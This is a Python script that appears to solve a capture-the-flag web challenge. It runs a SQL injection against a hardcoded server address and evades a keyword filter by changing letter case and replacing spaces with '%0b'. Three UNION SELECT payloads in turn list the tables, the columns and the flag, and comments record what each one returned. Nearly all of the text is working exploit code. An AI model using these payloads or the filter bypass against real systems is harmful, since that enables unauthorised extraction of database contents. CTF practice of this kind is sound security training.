import requests, re

BASE_URL = 'http://128.199.177.181:4444/info.php?id='

def bypass(query):
  rep = {
    'union': 'UnIoN',
    'select': 'sElECt',
    'join': 'jOiN',
    'from': 'fRoM',
    ' ': '%0b',
  }

  for i, j in rep.items():
    query = query.replace(i, j)
  return query

q1 = '0 union select * from (select 1)a join (select 2)b join (select table_name from information_schema.tables where table_schema=database())c#'
#print(bypass(q1))
r = requests.get(BASE_URL+bypass(q1))
#r.content reveals table R4pp3r

q2 = '0 union select * from (select 1)a join (select 2)b join (select group_concat(column_name) from information_schema.columns where length(table_name)=6)c#'
#print(bypass(q2))
r = requests.get(BASE_URL+bypass(q2))
#r.content reveals column s3rcur3_fl4g

q3 = '0 union select * from (select 1)a join (select 2)b join (select s3rcur3_fl4g from R4pp3r)c#'
r = requests.get(BASE_URL+bypass(q3))
print(re.findall(r"efiensctf{.*?}", r.content.decode())[0])
#efiensctf{Nice_try._You_are_also_talented_rapper!}